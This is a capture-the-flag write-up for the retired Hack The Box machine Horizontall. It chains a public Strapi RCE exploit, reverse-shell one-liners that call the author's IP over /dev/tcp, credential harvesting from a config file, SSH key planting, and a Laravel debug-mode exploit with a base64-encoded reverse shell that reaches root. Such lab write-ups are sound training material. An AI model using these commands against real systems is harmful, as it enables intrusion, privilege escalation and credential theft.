# Horizontall

This is the write-up for the box Horizontall that got retired at the 5th February 2022.
My IP address was 10.10.14.11 while I did this.

Let's put this in our hosts file:
```markdown
10.10.11.105    horizontall.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/horizontall.nmap 10.10.11.105
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee774143d482bd3e6e6e50cdff6b0dd5 (RSA)
|   256 3ad589d5da9559d9df016837cad510b0 (ECDSA)
|_  256 4a0004b49d29e7af37161b4f802d9894 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The web service automatically redirects to the hostname _horizontall.htb_ and is a static website without much information.

There is a JavaScript file _/js/app.c68eb462.js_ that may contain interesting information and when searching for the hostname, there is indeed a a call to a subnet:
```
http://api-prod.horizontall.htb/reviews
```

After adding the hostname _api-prod.horizontall.htb_ to our _/etc/hosts_ file, it can be accessed and the website has the title _"Welcome to your API"_.
The response header contains the value _"X-Powered-By: Strapi <strapi.io>"_ which means that the API is run with the Open-Source CMS [Strapi](https://strapi.io/).

Searching for hidden directories with **Gobuster**:
```
gobuster dir -u http://api-prod.horizontall.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds the following directories:
- _/users_
  - HTTP status code _403 Forbidden_
- _/reviews_
  - Three review comments from customers in JSON format
- _/admin_
  - Forwards to _/admin/auth/login_ which is the login page of **Strapi**

Searching for public exploits for **Strapi**:
```
searchsploit strapi
```
```
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
```

The function _check_version_ in the exploit code shows that the version can be found on _/admin/init_.
It has the version _"3.0.0-beta.17.4"_ which should be vulnerable to this exploit.
```
python3 50239.py http://api-prod.horizontall.htb/
```
```
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit

[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
```

After running the exploit, it will start a command line to send requests to the API, but it is also possible to login with the provided credentials.

Testing command execution with `curl`:
```
curl 10.10.14.11:8000
```

My web server received a request, so command execution is working to gain a reverse shell:
```
bash -c 'bash -i >& /dev/tcp/10.10.14.11/9001 0>&1'
```

The command works and the listener on my IP and port 9001 starts a reverse shell as the user _strapi_.

## Privilege Escalation

The directory of the web service is in _/opt/strapi/myapi/_.

Searching for passwords in the _config_ directory:
```
grep -Ri password .
```

The file _environments/development/database.json_ has credentials for a MySQL database:
```
(...)
"client": "mysql",
"database": "strapi",
"host": "127.0.0.1",
"port": 3306,
"username": "developer",
"password": "#J!:F9Zt2u"
```

Accessing the database:
```
mysql -u developer -p
```

Enumerating database information:
```
mysql> show databases;
mysql> use strapi;

mysql> show tables;

mysql> select * from strapi_administrator;
```
```
+----+----------+-----------------------+--------------------------------------------------------------+
| id | username | email                 | password                                                     |
+----+----------+-----------------------+--------------------------------------------------------------+
|  3 | admin    | admin@horizontall.htb | $2a$10$4yPgwjBYUhPVKbobt4D4nOTikInAX/Wt3XUgvnnXLUSa84p8Z8xMO |
+----+----------+-----------------------+--------------------------------------------------------------+
```

There is a password hash for the user _admin_, which can be potentially cracked, but lets enumerate the services on the box more.

### Enumerating the Box

When checking the listening ports with `ss -lnpt`, it shows that port 8000 is listening on localhost.
To forward the port, it is recommended to start a real SSH connection to use SSH features for port forwarding.

Creating SSH key:
```
ssh-keygen -f strapi.key
```

Creating _.ssh_ directory and adding new SSH key into _authorized_keys_:
```
mkdir .ssh

cd .ssh

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ(...) > authorized_keys

chmod 600 authorized_keys
```

Connecting to the box via SSH and forwarding port 8000 to port 8001 on our local client:
```
ssh -i strapi.key -L 8001:127.0.0.1:8000 strapi@10.10.11.105
```

When browsing to 127.0.0.1 on port 8001, it shows that it is hosting the PHP framework [Laravel](https://laravel.com/) and in the right corner it shows that it is version _7.4.18_.

Searching for hidden directories with **Gobuster**:
```
gobuster dir -u http://127.0.0.1:8001 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds the path _/profiles_ which shows a very detailed error message and it becomes clear that the service is running in **debug mode**.

There is a public **Remote Code Execution** exploit for **Laravel** in debug mode:
```
searchsploit laravel debug
```
```
Laravel 8.4.2 debug mode - Remote code execution
```

Base64-encoding a reverse shell command:
```
echo 'bash -i >& /dev/tcp/10.10.14.11/9002 0>&1' | base64
```

Executing the exploit with the encoded reverse shell command:
```
python3 49424.py http://127.0.0.1:8001 /home/developer/myproject/storage/logs/laravel.log 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS85MDAyIDA+JjEK | base64 -d | bash'
```

After executing the script, it will exploit the vulnerability and the listener on my IP and port 9002 starts a reverse shell as root!
